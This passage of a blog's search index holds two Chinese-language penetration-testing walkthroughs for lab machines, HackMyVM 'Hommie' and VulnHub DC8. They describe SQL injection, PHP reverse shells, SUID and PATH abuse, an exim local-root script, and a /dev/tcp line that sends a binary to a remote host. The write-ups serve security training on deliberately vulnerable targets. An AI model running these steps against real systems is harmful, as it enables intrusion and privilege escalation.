+<h1 id="Hommie"><a href="#Hommie" class="headerlink" title="Hommie"></a>Hommie</h1><h2 id="端口扫描-信息收集"><a href="#端口扫描-信息收集" class="headerlink" title="端口扫描&#x2F;信息收集"></a>端口扫描&#x2F;信息收集</h2><p><img src="https://pic1.imgdb.cn/item/679a3ec2d0e0a243d4f87a20.png" alt="|700"><br>发现有三个端口  ftp ssh http<br>先看看ftp能不能匿名登录<br><img src="https://pic1.imgdb.cn/item/679a3ec6d0e0a243d4f87a21.png" alt="|550"><br>尝试把反弹shell文件上传  无法得到shell<br>80端口<br><img src="https://pic1.imgdb.cn/item/679a3ec8d0e0a243d4f87a22.png"><br>得到两个用户 alexia nobody   并且提示我们要得到alexia的id_rsa<br>目录扫描<br><img src="https://pic1.imgdb.cn/item/679a3eccd0e0a243d4f87a23.png"><br><img src="https://pic1.imgdb.cn/item/679a3ed0d0e0a243d4f87a24.png"><br>使用了两个常用的目录字典都没有扫描到 说明大概率就是没有其他目录<br>web如果没有信息就说明信息收集还不过     – 重新用nmap扫描  看看有没有其他服务<br> <img src="https://pic1.imgdb.cn/item/679a3ef9d0e0a243d4f87a28.png"><br> 有新的发现  还有开放dhcpc tftp 服务<br> 根据前面的提示  get id_rsa  成功得到rsa私钥  登录到ssh<br> <img src="https://pic1.imgdb.cn/item/679a3f04d0e0a243d4f87a2d.png"><br> 成功拿到shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a3f07d0e0a243d4f87a2e.png"><br>没有sudo指令  查suid  不一样的就是的第一个<code>/opt/showMetheKey</code><br>执行这个文件之后 发现是一个rsa私钥<br><img src="https://pic1.imgdb.cn/item/679a3f0cd0e0a243d4f87a2f.png"><br>这个私钥是当前用户的  我们要想办法得到root用户的<br>现在将这个文件下载到本地 <code>cat showMetheKey &gt; /dev/tcp/192.168.240.83/1234</code><br><img src="https://pic1.imgdb.cn/item/679a3f0cd0e0a243d4f87a30.png"><br>用ida分析这个程序<br><img src="https://pic1.imgdb.cn/item/679a3f80d0e0a243d4f87a3a.png"></p>
+<p>所以修改环境变量 这样子就可以得到root的rsa私钥<br><img src="https://pic1.imgdb.cn/item/679a3f73d0e0a243d4f87a33.png"><br><img src="https://pic1.imgdb.cn/item/679a3f7ad0e0a243d4f87a38.png"><br>成功登录到root<br><img src="https://pic1.imgdb.cn/item/679a3f7fd0e0a243d4f87a39.png"></p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>hmv</category>
+      </categories>
+      <tags>
+        <tag>-渗透 -hmv</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC8靶场复盘</title>
+    <url>/posts/51727.html</url>
+    <content><![CDATA[<p>vulnhub-DC8靶场复盘</p>
+<span id="more"></span>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>这个主要考察从web端进入</p>
+<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>0.用dirsearch找到网页所有的目录  知道有mysql服务 暗示要sql注入  而且有robots.txt 其中有user&#x2F;login目录<br>1.在网页点击其他链接的时候看到url有参数 尝试注释闭合<br>发现有sql注入点<br><img src="https://pic1.imgdb.cn/item/679a1620d0e0a243d4f87546.png" alt="|550"><br>2.用sqlmap得到管理员账号<br><img src="https://pic1.imgdb.cn/item/679a1620d0e0a243d4f87547.png" alt="|500"><br>最终找到两条记录 然后将这个hash放到一个目录用john 去跑 可以找到john的密码<br>3.登录网站管理员的账号<br>有一个edit选项 里面可以上传文件 但是无法上传php文件<br><img src="https://pic1.imgdb.cn/item/679a1621d0e0a243d4f87548.png" alt="|500"><br>在contactus webform 发现可以修改用户上传之后的提示回显  并且可以用PHP代码 实验之后发现确实可以渲染php<br>现在可以用system指令来反弹shell<br><img src="https://pic1.imgdb.cn/item/679a1621d0e0a243d4f87549.png" alt="|525"><br><img src="https://pic1.imgdb.cn/item/679a1622d0e0a243d4f8754a.png"><br>这个指令可以在反弹的shell里面加上前缀 可以美化输出<br>随便看看这个用户目录下的文件 </p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null  意思从根目录开始找 所有者是root 只包括suid 的 然后将标准错误不输出<br><img src="https://pic1.imgdb.cn/item/679a1666d0e0a243d4f8754f.png" alt="|500"><br>这里利用exim提权（先查看这里exim4的版本  用searchsploit exim发现漏洞<br>然后把文件复制到&#x2F;var&#x2F;www&#x2F;html 下方便传输到受害机<br><img src="https://pic1.imgdb.cn/item/679a1669d0e0a243d4f87550.png" alt="|425"><br>在受害机上面用wget接受这个脚本<br><img src="https://pic1.imgdb.cn/item/679a166ad0e0a243d4f87551.png"><br><img src="https://pic1.imgdb.cn/item/679a166bd0e0a243d4f87552.png"><br>有两种方法使用这个脚本 选择第二种 因为 第二种在脚本说可以有一个shell<br>但是如果我们用 cat -A 查看这个a.sh 文件发现 末尾都是^M<br>用dos2unix转换之后 可以运行   bash a.sh -m netcat<br><img src="https://pic1.imgdb.cn/item/679a166cd0e0a243d4f87553.png" alt="|450"><br>发现成功提权 然后到&#x2F;root目录下 就解决！！ </p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>vulnhub</tag>
       </tags>
   </entry>
 </search>
